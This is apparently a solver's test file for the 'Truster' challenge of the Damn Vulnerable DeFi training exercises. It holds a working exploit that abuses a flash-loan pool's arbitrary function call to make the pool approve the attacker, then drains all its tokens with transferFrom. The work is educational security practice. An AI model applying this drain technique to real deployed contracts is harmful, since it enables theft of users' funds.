const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** EXPLOIT
            Using the 'functionCall' in the 'flashLoan' function, we can make the pool contract approve the attacker for spending the entire token amount in the pool.
            It's then possible to call the 'transferFrom' function from the attacker account to empty the pool contract.

            Note: I'm not sure how to do it in one transaction as the website challenge notes claims it (excluding the custom contract constructor trick used in the 
            previous exploit which should work here as well).
        */
        const PoolAttackerInstance = await this.pool.connect(attacker);
        let approveABI = ["function approve(address spender, uint256 amount)"];
        let approveIFace = new ethers.utils.Interface(approveABI);
        
        expect(
            await this.token.allowance(this.pool.address, attacker.address)
        ).to.equal('0');

        await PoolAttackerInstance.flashLoan(
            0, 
            attacker.address, 
            await this.pool.damnValuableToken(),
            approveIFace.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL])
        );
        
        expect(
            await this.token.allowance(this.pool.address, attacker.address)
        ).to.equal(TOKENS_IN_POOL); // Check for the successfull 'approve' call, allowing the attacker to spend the tokens

        const TokenAttackerInstace = await this.token.connect(attacker);
        await TokenAttackerInstace.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

